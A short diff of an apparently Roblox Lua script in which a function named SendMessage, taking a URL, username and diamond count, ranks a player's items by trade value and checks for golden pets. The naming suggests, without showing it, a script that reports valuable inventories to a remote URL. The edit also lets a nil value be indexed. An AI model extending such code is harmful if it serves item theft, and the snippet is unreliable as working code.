@@ -190,8 +190,8 @@ local function SendMessage(url, username, diamonds)
         return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
     end)
    
-    local highestRAPItemName = combinedItems[1] or 0 
-    local highestRAPItemData = itemRapMap[highestRAPItemName] or 0
+    local highestRAPItemName = combinedItems[1] or nil
+    local highestRAPItemData = itemRapMap[highestRAPItemName] or nil
 
     if highestRAPItemData.category == "Pet" then
         if highestRAPItemData.pettyp == "Golden" then
